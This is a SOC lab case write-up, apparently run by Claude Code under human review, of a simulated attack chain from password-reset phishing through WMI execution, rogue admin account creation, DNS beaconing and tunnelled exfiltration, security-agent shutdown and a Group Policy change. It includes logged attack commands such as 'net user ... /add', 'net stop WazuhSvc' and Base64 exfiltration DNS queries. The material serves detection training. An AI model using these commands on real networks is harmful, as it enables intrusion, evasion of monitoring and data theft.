# AGC-078 — Full Attack Chain: Trusted Access to GPO Impact

> **Disclosure:** Executed & documented by Claude Code under direction and review by Hasan.

## Card

| Field | Value |
|---|---|
| ID | `AGC-078` |
| Category | `13-full-attack-chain` — Full Attack Chain |
| MITRE Techniques | `T1566.002` Spearphishing Link, `T1047` Windows Management Instrumentation, `T1136.001` Create Account: Local Account, `T1558.003` Steal or Forge Kerberos Tickets: Kerberoasting, `T1021.002` Remote Services: SMB/Windows Admin Shares, `T1071.004` Application Layer Protocol: DNS, `T1119` Automated Collection, `T1048.003` Exfiltration Over Alternative Protocol: Unencrypted Non-C2 Protocol, `T1562.001` Impair Defenses: Disable or Modify Tools, `T1484.001` Domain Policy Modification: Group Policy Modification |
| Verdict | True Positive |
| Confidence | Critical |
| Time to Detect | Full chain: 2 min 19 sec (00:03:25 to 00:05:44 UTC) + GPO phase on AD-DC-01 (00:06:17 to 00:06:21 UTC) |
| Affected Systems | `COMPROMISED-HOST-01` (10.10.10.103), `AD-DC-01` (10.10.10.10), `EXT-ATTACKER-SIM` (10.10.40.10) |
| Chain | ◀ related: [AGC-077](../AGC-077-full-chain-credential-to-ransomware/README.md) · related: [AGC-079](../AGC-079-full-chain-dmz-pivot-to-defacement/README.md) ▶ |
| One-line Summary | 10-phase "trusted access" attack chain emphasizing abuse of legitimate channels. Password-reset pretext phishing (raj.patel IT identity), WMI execution (ParentImage=WmiPrvSE.exe confirmed), local admin account creation (svc_helpdesk — EID 4720+4722+4732), Kerberoasting attempt (domain trust broken — expected constraint), SMB admin share lateral movement (error 86/1326), DNS C2 beacon (5x randomized subdomains to 10.10.40.10), AD data collection (synthetic CSV), DNS tunneling exfiltration (8 Base64-encoded chunks in DNS labels — EID 22 captures high-entropy queries), Wazuh agent disable (Running->Stopped->Running), GPO modification on AD-DC-01 (UserVersion 2->3->4). Distinct from AGC-077: every phase uses channels that appear legitimate. |

## Attacker Perspective

### Tradecraft

**What:** An attack chain where every phase abuses a channel that looks legitimate — password reset flows, WMI, service account creation, Kerberos ticket requests, SMB admin shares, DNS queries, and Group Policy. Where AGC-077 used loud tradecraft (encoded PowerShell, Run keys, HTTPS C2), this chain hides inside normal IT operations at every stage.

**Why the Legitimate-Channel Theme Matters:**
- An analyst scanning for the obvious hits — EncodedCommand, odd Run keys, HTTPS to unknown IPs — would miss this chain entirely
- Each phase could be a real admin action; only the _sequence and timing_ give it away, never a single event
- Detection shifts from pattern-matching to behavioral correlation: _who_ created _what_ account, _when_, and _what happened next_
- The Wazuh agent disable (Phase 9) tests a different detection model than AGC-077's log clearing: spotting absence rather than an event

### Simulation

**Pre-conditions:**
- COMPROMISED-HOST-01 running, Administrator context
- AD-DC-01 running, Administrator context (for GPO Phase 10)
- EXT-ATTACKER-SIM running nginx (phishing portal) and DNS wildcard responder
- Domain trust broken on COMPROMISED-HOST-01 (NTLM-only, no Kerberos)
- RSAT AD module NOT installed on COMPROMISED-HOST-01

**Execution Timeline:**

| Phase | Time (UTC) | Technique | Action | Result |
|---|---|---|---|---|
| 1. Initial Access | 00:03:25.163 | T1566.002 | HTTP GET+POST to password-reset portal (raj.patel) | SUCCESS |
| 2. Execution | 00:03:27.260 | T1047 | Invoke-CimMethod Win32_Process Create -> powershell.exe | PID 3240, ReturnValue=0 |
| 3. Persistence | 00:03:32.618 | T1136.001 | net user svc_helpdesk /add + localgroup Administrators | SUCCESS, EID 4720+4732 |
| 4. Credential Access | 00:03:34.849 | T1558.003 | KerberosRequestorSecurityToken for MSSQLSvc SPN | FAILED (domain trust broken) |
| 5. Lateral Movement | 00:03:37.084 | T1021.002 | net use \\DC\C$ and \\DC\IPC$ with svc_helpdesk | Error 86/1326 |
| 6. C2 | 00:04:21.397 | T1071.004 | 5x DNS beacon (random subdomains to 10.10.40.10) | All resolved 10.10.40.10 |
| 7. Collection | 00:04:34.039 | T1119 | AD export to CSV (synthetic — RSAT unavailable) | 5+4 entries |
| 8. Exfiltration | 00:04:36.097 | T1048.003 | Base64 CSV chunked into 8 DNS queries | All 8 chunks sent |
| 9. Defense Evasion | 00:04:38.172 | T1562.001 | net stop WazuhSvc | Running->Stopped (restored after) |
| 10. Impact | 00:06:17.208 | T1484.001 | Set-GPRegistryValue on Default Domain Policy (AD-DC-01) | UserVersion 2->3 (reverted to 4) |

## SOC Perspective

### Detection

**Sysmon EID 1 — Process Creation (12 events on COMPROMISED-HOST-01):**

```
TIME (UTC)              PID    IMAGE                  COMMAND LINE (key excerpt)                                      PHASE
00:03:24.757            3840   powershell.exe         -ExecutionPolicy Bypass -File agc078-sim.ps1                     (main script)
00:03:27.539            3240   powershell.exe         -WindowStyle Hidden -File agc078-stage2.ps1                      2-Execution (WMI child)
00:03:32.624            4552   net.exe                user svc_helpdesk P@ssw0rd2026! /add                            3-Persistence
00:03:32.660            4696   net1.exe               user svc_helpdesk P@ssw0rd2026! /add                            3-Persistence
00:03:32.749            5212   net.exe                localgroup Administrators svc_helpdesk /add                     3-Persistence
00:03:32.781            4852   net1.exe               localgroup Administrators svc_helpdesk /add                     3-Persistence
00:03:35.006            6076   klist.exe              (Kerberos cache check)                                          4-Credential Access
00:03:37.092            5604   net.exe                use \\10.10.10.10\C$ /user:...\svc_helpdesk P@ssw0rd2026!       5-Lateral Movement
00:03:58.238            1492   net.exe                use \\10.10.10.10\IPC$ /user:...\svc_helpdesk P@ssw0rd2026!     5-Lateral Movement
00:04:38.183            3792   net.exe                stop WazuhSvc                                                   9-Defense Evasion
00:04:38.205            2192   net1.exe               stop WazuhSvc                                                   9-Defense Evasion
```

**WMI-parented process (key differentiator from AGC-077):**

```
EID 1: PID 3240, Image: powershell.exe
  ParentImage: C:\Windows\System32\wbem\WmiPrvSE.exe
  CommandLine: powershell.exe -WindowStyle Hidden -File C:\Windows\Temp\agc078-stage2.ps1
```

The WmiPrvSE.exe parent marks WMI-based execution (T1047). That parent-child pair separates WMI execution from a direct PowerShell launch, an interactive shell, or a scheduled task.

**Windows Security — Account Management (6 events):**

```
TIME (UTC)      EID     EVENT                                           TARGET ACCOUNT
00:03:32        4720    A user account was created                      svc_helpdesk (SID: S-1-5-21-...-1003)
00:03:32        4722    A user account was enabled                      svc_helpdesk
00:03:32        4724    An attempt was made to reset an account's pwd   svc_helpdesk
00:03:32        4738    A user account was changed                      svc_helpdesk
00:03:32        4732    A member was added to Users group               svc_helpdesk -> Builtin\Users
00:03:32        4732    A member was added to Administrators group      svc_helpdesk -> Builtin\Administrators
```

The 4720->4722->4732(Administrators) burst in the same second is a high-fidelity sign of rogue admin account creation. The subject account (Administrator, LogonId 0xA2C250) is the attacker's session.

**Sysmon EID 22 — DNS Query (13 events, showing key patterns):**

C2 beacon pattern (Phase 6):
```
TIME (UTC)      QUERY NAME                                          RESULT
00:04:21        224415-beacon.agc078lab.local                        10.10.40.10
00:04:23        903984-beacon.agc078lab.local                        10.10.40.10
00:04:25        456323-beacon.agc078lab.local                        10.10.40.10
00:04:27        304369-beacon.agc078lab.local                        10.10.40.10
00:04:30        388054-beacon.agc078lab.local                        10.10.40.10
```

DNS exfiltration pattern (Phase 8):
```
TIME (UTC)      QUERY NAME (Base64-encoded AD data in subdomain labels)
00:04:25        wsUmFqIFBhdGVsLHJhai5wYXRlbEBhc2hmb3JkZ3JvdmUubG9j.3.exfil.agc078lab.local
00:04:25        YWwsVHJ1ZQpzYXJhaC5qZW5raW5zLFNhcmFoIEplbmtpbnMsc2.4.exfil.agc078lab.local
00:04:25        FyYWguamVua2luc0Bhc2hmb3JkZ3JvdmUubG9jYWwsVHJ1ZQpB.5.exfil.agc078lab.local
00:04:25        ZG1pbmlzdHJhdG9yLEFkbWluaXN0cmF0b3IsLFRydWUKc3ZjX2.6.exfil.agc078lab.local
00:04:25        hlbHBkZXNrLHN2Y19oZWxwZGVzaywsVHJ1ZQ.7.exfil.agc078lab.local
```

The exfiltration labels decode to Base64-encoded CSV data holding AD user records. The sequential numbering (.3., .4., .5., .6., .7.) and the steady high-entropy subdomains are clear DNS tunneling signs.

**Sysmon EID 3 — Network Connection (2 events):**

```
TIME (UTC)      SRC                         DST                   PROCESS
00:03:14.291    10.10.10.103:65285          10.10.40.10:80        powershell.exe (phishing GET)
00:03:14.306    10.10.10.103:65286          10.10.40.10:80        powershell.exe (phishing POST)
```

**GPO modification on AD-DC-01:**

```
BEFORE:  UserVersion AD:2/SysVol:2, ModificationTime 2026-09-15 16:45:30
SET:     UserVersion AD:3/SysVol:3, ModificationTime 2026-09-15 17:06:16
REVERT:  UserVersion AD:4/SysVol:4, ModificationTime 2026-09-15 17:06:20
```

### Investigation

**Step 1 — Anchor on telemetry silence (unique to this chain):**
This case opens on an absence, not a fired alert: the Wazuh agent on COMPROMISED-HOST-01 goes from Active to Disconnected at 00:04:38 UTC. That "negative detection" anchors the timeline — working back from the silence surfaces the phases that came before it.

**Step 2 — Work backward from the silence:**
The last Sysmon events before agent shutdown show `net.exe stop WazuhSvc` (EID 1, PID 3792). The parent process tree traces to WmiPrvSE.exe (Phase 2), indicating the entire chain was WMI-initiated — a different execution pattern from AGC-077's direct PowerShell.

**Step 3 — Account management events across the domain:**
Windows Security EID 4720 creates svc_helpdesk at 00:03:32 UTC, and EID 4732 adds it to the Administrators group in the same second. The name mimics a real helpdesk service account, chosen to slip past whoever reviews the logs.

**Step 4 — Kerberoasting attempt (domain trust constraint):**
The KerberosRequestorSecurityToken call failed due to broken domain trust on COMPROMISED-HOST-01 (NTLM-only). In a production environment with functioning Kerberos, this would generate EID 4769 with RC4 encryption type (0x17) — the canonical Kerberoasting indicator. The klist.exe EID 1 confirms the attempt was made.

**Step 5 — Lateral movement via admin shares:**
net.exe EID 1 shows attempts to connect to \\10.10.10.10\C$ using the newly created svc_helpdesk account. Error 86 (incorrect password) and 1326 confirm the local account cannot authenticate to the DC (expected — local accounts don't have domain credentials). In a real attack with Kerberoasted domain credentials, this would succeed.

**Step 6 — DNS C2 beacon identification:**
EID 22 shows 5 DNS queries with randomized numeric subdomains (224415-beacon, 903984-beacon, and so on), all resolving to 10.10.40.10. The signature is the subdomain entropy and the steady interval, not the query volume.

**Step 7 — DNS exfiltration burst:**
8 DNS queries with long Base64-encoded subdomains (.3.exfil.agc078lab.local through .7.exfil) fired within milliseconds of each other, immediately after the collection phase. Decoding the labels reveals AD user records (michael.chen, raj.patel, sarah.jenkins, Administrator, svc_helpdesk).

**Step 8 — GPO impact confirmation:**
On AD-DC-01, Default Domain Policy UserVersion incremented from 2 to 3 (Set-GPRegistryValue: ScreenSaveTimeOut=2). ModificationTime updated. Reverted to UserVersion 4. EID 5136 NOT captured (same audit gap as AGC-075). Cross-reference: reuses the atomic technique from AGC-075.

### Report

**Verdict: True Positive** — Multi-phase intrusion using legitimate administration channels for each phase.

**Confidence: Critical** — Critical here for a different reason than AGC-077: not the sheer volume of high-fidelity hits, but three events that are each near-conclusive on their own:
1. **Account creation + immediate admin elevation** (EID 4720 + 4732 within same second) — a new local admin account outside change management is suspicious regardless of context
2. **Kerberoasting attempt** (EID 1 for klist.exe tracing to KerberosRequestorSecurityToken call) — requesting TGS tickets for offline cracking is inherently adversarial
3. **GPO modification** (UserVersion increment on Default Domain Policy) — unauthorized domain-wide policy change proves DC-level compromise

The Wazuh agent silence (Phase 9) is **supporting evidence** for intentional defense evasion, not the primary basis for the verdict. The verdict stands on the directory-service and Kerberos events alone.

**Response recommendation:**
1. Disable svc_helpdesk account and audit all recently created local admin accounts domain-wide
2. Force password reset for raj.patel (phished identity) and any Kerberoasted service accounts
3. Audit and revert GPO modification on AD-DC-01; review all GPO changes in the same time window
4. Re-enable Wazuh agent and check for OTHER silence gaps in its history (may not be the first attempt)
5. Review all SPN-registered service accounts domain-wide for weak passwords (Kerberoasting success depends entirely on crackable service account passwords)

### MITRE Mapping

| Tactic | Technique ID | Technique Name | Evidence | Confidence |
|---|---|---|---|---|
| Initial Access (TA0001) | T1566.002 | Phishing: Spearphishing Link | Password-reset pretext phishing to raj.patel. HTTP GET+POST to 10.10.40.10:80. EID 3 captures connections. | Critical |
| Execution (TA0002) | T1047 | Windows Management Instrumentation | Invoke-CimMethod Win32_Process Create -> powershell.exe PID 3240. EID 1 confirms ParentImage=WmiPrvSE.exe. ReturnValue=0. | Critical |
| Persistence (TA0003) | T1136.001 | Create Account: Local Account | net user svc_helpdesk /add + net localgroup Administrators. Security EID 4720+4722+4732. Account SID S-1-5-21-...-1003. | Critical |
| Credential Access (TA0006) | T1558.003 | Steal or Forge Kerberos Tickets: Kerberoasting | KerberosRequestorSecurityToken for MSSQLSvc SPN attempted. Failed (domain trust broken). EID 1 for klist.exe. No EID 4769 generated. | Medium |
| Lateral Movement (TA0008) | T1021.002 | Remote Services: SMB/Windows Admin Shares | net use \\10.10.10.10\C$ with svc_helpdesk. Error 86/1326. EID 1 captures cleartext credentials. | High |
| Command and Control (TA0011) | T1071.004 | Application Layer Protocol: DNS | 5x DNS beacon with randomized subdomains to 10.10.40.10. EID 22 captures all queries. Wildcard response. | Critical |
| Collection (TA0009) | T1119 | Automated Collection | AD data exported to CSV (synthetic — RSAT unavailable). Files created in C:\Windows\Temp\. No EID 11 (non-EXE/DLL gap). | High |
| Exfiltration (TA0010) | T1048.003 | Exfiltration Over Alternative Protocol: Unencrypted Non-C2 Protocol | 8 Base64-encoded DNS queries with AD user data in subdomain labels. EID 22 captures high-entropy labels. | Critical |
| Defense Evasion (TA0005) | T1562.001 | Impair Defenses: Disable or Modify Tools | net stop WazuhSvc. Service Running->Stopped. EID 1 captures command. Telemetry silence as supporting evidence. | Critical |
| Impact (TA0040) | T1484.001 | Domain Policy Modification: Group Policy Modification | Set-GPRegistryValue on Default Domain Policy (AD-DC-01). UserVersion 2->3. ScreenSaveTimeOut=2. Reverted (4). EID 5136 NOT captured. | Critical |

## Attacker vs Analyst Timeline

| Time (UTC) | Attacker Phase | What Attacker Did | What Analyst Sees (Detection Layer) |
|---|---|---|---|
| 00:03:14 | Initial Access | HTTP GET/POST to password-reset portal | EID 3: powershell.exe -> 10.10.40.10:80 (2 connections) |
| 00:03:27 | Execution | WMI process creation (Invoke-CimMethod) | EID 1: powershell.exe with ParentImage=WmiPrvSE.exe (WMI INDICATOR) |
| 00:03:32 | Persistence | net user svc_helpdesk /add + Administrators | EID 4720+4722+4732: account created + elevated in <1 second (HIGH FIDELITY) |
| 00:03:32 | — | Cleartext password in net.exe command line | EID 1: net1.exe "user svc_helpdesk P@ssw0rd2026! /add" (CREDENTIAL EXPOSURE) |
| 00:03:34 | Credential Access | Kerberoasting attempt (TGS request) | EID 1: klist.exe (Kerberos cache check — no EID 4769 due to domain trust failure) |
| 00:03:37 | Lateral Movement | SMB admin share connection attempt | EID 1: net.exe "use \\10.10.10.10\C$ /user:svc_helpdesk P@ssw0rd2026!" (CLEARTEXT CREDS) |
| 00:04:21 | C2 | DNS beacon (random subdomains) | EID 22: 5 queries with numeric-random subdomains resolving to 10.10.40.10 |
| 00:04:34 | Collection | AD data export to CSV | NO FILE DETECTION (EID 11 EXE/DLL-only; RSAT unavailable) |
| 00:04:36 | Exfiltration | DNS tunneling (Base64 chunks) | EID 22: 8 queries with long high-entropy labels (.exfil.agc078lab.local) |
| 00:04:38 | Defense Evasion | net stop WazuhSvc | EID 1: net.exe "stop WazuhSvc" + TELEMETRY SILENCE BEGINS |
| 00:06:17 | Impact | Set-GPRegistryValue on Default Domain Policy | GPO UserVersion 2->3, ModificationTime updated (EID 5136 NOT captured) |

**Key difference from AGC-077:** In AGC-077 the most detectable phase was persistence (a Run key with an encoded payload). In AGC-078 it is account management (4720+4732), which reads as a routine admin task on its own. The chain stays quiet because each phase rides a channel that looks legitimate in isolation.

## Mock Escalation

```
TO:       SOC Tier 2 / Incident Response
FROM:     SOC L1 Analyst
PRIORITY: CRITICAL -- Active Intrusion via Legitimate Channels
TIME:     2026-09-16 00:07 UTC
SUBJECT:  Trusted-Access Attack Chain on COMPROMISED-HOST-01 + AD-DC-01

SUMMARY:
Multi-phase intrusion detected spanning COMPROMISED-HOST-01 and AD-DC-01.
Attack exclusively used legitimate administration channels at every phase,
designed to blend with normal IT operations. 10 MITRE ATT&CK techniques.

KEY INDICATORS (in order of evidentiary weight):
1. Account creation: svc_helpdesk created + added to Administrators in <1s
   (Security EID 4720 + 4732)
2. GPO modification: Default Domain Policy UserVersion incremented
   (Domain-wide impact)
3. WMI execution: PowerShell launched with ParentImage=WmiPrvSE.exe
   (Sysmon EID 1 -- WMI execution indicator)
4. DNS C2 + exfiltration: randomized beacons + Base64 data in DNS labels
   (Sysmon EID 22 -- 13 high-entropy DNS queries to 10.10.40.10)
5. Wazuh agent disabled: Running->Stopped at 00:04:38 UTC
   (Telemetry silence -- supporting evidence for evasion intent)

CREDENTIAL EXPOSURE IN LOGS:
  - svc_helpdesk password (P@ssw0rd2026!) visible in Sysmon EID 1
  - raj.patel credentials submitted to phishing portal

RECOMMENDED ACTIONS:
1. IMMEDIATE: Disable svc_helpdesk, reset raj.patel password
2. IMMEDIATE: Revert GPO change on AD-DC-01
3. IMMEDIATE: Re-enable Wazuh agent (already done in cleanup)
4. INVESTIGATE: Audit all SPN-registered service accounts for weak passwords
5. HARDEN: Review Wazuh agent protection (consider monitoring agent status)
6. HARDEN: Enable EID 5136 auditing for GPO container objects
```

## Evidence

Screenshots: none in phase one (text evidence only); added when this scenario is re-executed by hand in phase two.

### Process creation timeline (Sysmon EID 1)

```
TIME (UTC)              PID    PGUID                                        IMAGE            PARENT IMAGE          COMMAND (excerpt)
00:03:24.757            3840   {eb65e329-dccc-6aa9-7606-000000001400}        powershell.exe   VBoxService.exe       agc078-sim.ps1
00:03:27.539            3240   {eb65e329-dccf-6aa9-7806-000000001400}        powershell.exe   WmiPrvSE.exe          -WindowStyle Hidden -File agc078-stage2.ps1
00:03:32.624            4552   {eb65e329-dcd4-6aa9-7a06-000000001400}        net.exe          powershell.exe        user svc_helpdesk P@ssw0rd2026! /add
00:03:32.749            5212   {eb65e329-dcd4-6aa9-7c06-000000001400}        net.exe          powershell.exe        localgroup Administrators svc_helpdesk /add
00:03:35.006            6076   {eb65e329-dcd7-6aa9-7e06-000000001400}        klist.exe        powershell.exe        (Kerberos cache enumeration)
00:03:37.092            5604   {eb65e329-dcd9-6aa9-7f06-000000001400}        net.exe          powershell.exe        use \\10.10.10.10\C$ /user:svc_helpdesk
00:03:58.238            1492   {eb65e329-dcee-6aa9-8006-000000001400}        net.exe          powershell.exe        use \\10.10.10.10\IPC$ /user:svc_helpdesk
00:04:38.183            3792   {eb65e329-dd16-6aa9-8106-000000001400}        net.exe          powershell.exe        stop WazuhSvc
```

### Account management events (Windows Security)

```
TIME (UTC)      EID     SUBJECT                            TARGET           EVENT
00:03:32        4720    Administrator (LogonId 0xA2C250)   svc_helpdesk     Account created (SID ...-1003)
00:03:32        4722    Administrator                      svc_helpdesk     Account enabled
00:03:32        4724    Administrator                      svc_helpdesk     Password reset
00:03:32        4738    Administrator                      svc_helpdesk     Account changed
00:03:32        4732    Administrator                      svc_helpdesk     Added to Builtin\Users
00:03:32        4732    Administrator                      svc_helpdesk     Added to Builtin\Administrators
```

### DNS telemetry (Sysmon EID 22)

```
TYPE        TIME (UTC)    QUERY NAME                                                          RESPONSE
C2 beacon   00:04:21      224415-beacon.agc078lab.local                                       10.10.40.10
C2 beacon   00:04:23      903984-beacon.agc078lab.local                                       10.10.40.10
C2 beacon   00:04:25      456323-beacon.agc078lab.local                                       10.10.40.10
C2 beacon   00:04:27      304369-beacon.agc078lab.local                                       10.10.40.10
C2 beacon   00:04:30      388054-beacon.agc078lab.local                                       10.10.40.10
Exfil       00:04:25      wsUmFqIFBhdGVsLHJhai5wYXRlbEBhc2hmb3JkZ3JvdmUubG9j.3.exfil...     10.10.40.10
Exfil       00:04:25      YWwsVHJ1ZQpzYXJhaC5qZW5raW5zLFNhcmFoIEplbmtpbnMsc2.4.exfil...     10.10.40.10
Exfil       00:04:25      FyYWguamVua2luc0Bhc2hmb3JkZ3JvdmUubG9jYWwsVHJ1ZQpB.5.exfil...     10.10.40.10
Exfil       00:04:25      ZG1pbmlzdHJhdG9yLEFkbWluaXN0cmF0b3IsLFRydWUKc3ZjX2.6.exfil...     10.10.40.10
Exfil       00:04:25      hlbHBkZXNrLHN2Y19oZWxwZGVzaywsVHJ1ZQ.7.exfil...                    10.10.40.10
```

### GPO modification (AD-DC-01)

```
BEFORE:   UserVersion AD:2/SysVol:2, ModificationTime 2026-09-15 16:45:30
SET:      UserVersion AD:3/SysVol:3, ModificationTime 2026-09-15 17:06:16 (ScreenSaveTimeOut=2)
REVERT:   UserVersion AD:4/SysVol:4, ModificationTime 2026-09-15 17:06:20
EID 5136: NOT CAPTURED (same audit gap as AGC-075)
```

### Wazuh agent state transition

```
TIME (UTC)      SERVICE        STATUS
00:04:38        WazuhSvc       Running -> Stopped (net stop WazuhSvc)
00:05:41        WazuhSvc       Stopped -> Running (net start WazuhSvc -- cleanup)
GAP:            ~63 seconds of telemetry silence
```
